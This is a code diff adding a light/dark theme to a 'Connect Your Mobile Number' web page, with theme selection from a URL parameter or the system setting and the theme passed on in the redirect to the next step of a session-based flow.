@@ -5,6 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connect Your Mobile Number</title>
     <style>
+        :root {
+            /* Light Theme Variables */
+            --bg-color: #ffffff;
+            --text-primary: #2d333a;
+            --text-secondary: #6e6e80;
+            --input-border: #c2c8d0;
+            --input-bg: #ffffff;
+            --input-text: #000000;
+            --input-focus: #000000;
+            --label-bg: #ffffff;
+            --btn-bg: #0f172a;
+            --btn-text: #ffffff;
+            --btn-hover: #1e293b;
+            --error-color: #d93025;
+        }
+
+        :root.dark-theme {
+            /* Dark Theme Variables */
+            --bg-color: #000000;
+            --text-primary: #ffffff;
+            --text-secondary: #a1a1aa;
+            --input-border: #3f3f46;
+            --input-bg: #000000;
+            --input-text: #ffffff;
+            --input-focus: #ffffff;
+            --label-bg: #000000;
+            --btn-bg: #ffffff;
+            --btn-text: #000000;
+            --btn-hover: #e4e4e7;
+            --error-color: #f87171;
+        }
+
         * {
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -17,7 +49,8 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background-color: #ffffff;
+            background-color: var(--bg-color);
+            transition: background-color 0.3s ease;
         }
 
         .container {
@@ -31,15 +64,17 @@
             font-size: 32px;
             font-weight: 600;
             margin-bottom: 10px;
-            color: #2d333a;
+            color: var(--text-primary);
             letter-spacing: -0.5px;
+            transition: color 0.3s ease;
         }
 
         p {
             font-size: 16px;
-            color: #6e6e80;
+            color: var(--text-secondary);
             line-height: 1.5;
             margin-bottom: 30px;
+            transition: color 0.3s ease;
         }
 
         .input-group {
@@ -52,25 +87,28 @@
             position: absolute;
             top: -10px;
             left: 15px;
-            background: white;
+            background: var(--label-bg);
             padding: 0 5px;
             font-size: 12px;
-            color: #999;
+            color: var(--text-secondary);
             z-index: 1;
+            transition: background-color 0.3s ease, color 0.3s ease;
         }
 
         input[type="tel"] {
             width: 100%;
             padding: 16px;
             font-size: 18px;
-            border: 1px solid #c2c8d0;
+            background-color: var(--input-bg);
+            color: var(--input-text);
+            border: 1px solid var(--input-border);
             border-radius: 30px;
             outline: none;
-            transition: border-color 0.2s;
+            transition: border-color 0.2s, background-color 0.3s, color 0.3s;
         }
 
         input[type="tel"]:focus {
-            border-color: #000;
+            border-color: var(--input-focus);
         }
 
         /* Remove arrows from number input */
@@ -83,27 +121,63 @@
         .btn-continue {
             width: 100%;
             padding: 14px;
-            background-color: #0f172a;
-            color: white;
+            background-color: var(--btn-bg);
+            color: var(--btn-text);
             border: none;
             border-radius: 30px;
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
             margin-top: 10px;
+            transition: background-color 0.2s, color 0.2s;
         }
 
         .btn-continue:hover {
-            background-color: #1e293b;
+            background-color: var(--btn-hover);
         }
 
         .error-msg {
-            color: #d93025;
+            color: var(--error-color);
             font-size: 13px;
             margin-top: 5px;
             display: none;
         }
     </style>
+
+    <!-- Theme Handling Script -->
+    <script>
+        function applyTheme() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const themeParam = urlParams.get('theme');
+            const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)');
+
+            if (themeParam === 'dark') {
+                document.documentElement.classList.add('dark-theme');
+            } else if (themeParam === 'light') {
+                document.documentElement.classList.remove('dark-theme');
+            } else if (systemPrefersDark.matches) {
+                document.documentElement.classList.add('dark-theme');
+            } else {
+                document.documentElement.classList.remove('dark-theme');
+            }
+        }
+
+        // Apply immediately to prevent Flash of Unstyled Content (FOUC)
+        applyTheme();
+
+        // Listen for real-time system native theme changes
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
+            const urlParams = new URLSearchParams(window.location.search);
+            // Only adapt to system changes if no explicit URL theme overrides it
+            if (!urlParams.has('theme')) {
+                if (e.matches) {
+                    document.documentElement.classList.add('dark-theme');
+                } else {
+                    document.documentElement.classList.remove('dark-theme');
+                }
+            }
+        });
+    </script>
 </head>
 <body>
 
@@ -153,6 +227,13 @@
             return urlParams.get('session');
         };
 
+        // Function to carry over theme param to next page if it exists
+        const getThemeParam = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const theme = urlParams.get('theme');
+            return theme ? `&theme=${theme}` : '';
+        };
+
         const sessionId = getSessionId();
 
         // Restriction: Only allow 10 digits
@@ -185,8 +266,8 @@
                     updatedAt: serverTimestamp()
                 });
 
-                // Redirect to 6.html with same session ID
-                window.location.href = `6.html?session=${sessionId}`;
+                // Redirect to 6.html with same session ID and keep theme intact
+                window.location.href = `6.html?session=${sessionId}${getThemeParam()}`;
 
             } catch (e) {
                 console.error("Error updating document: ", e);
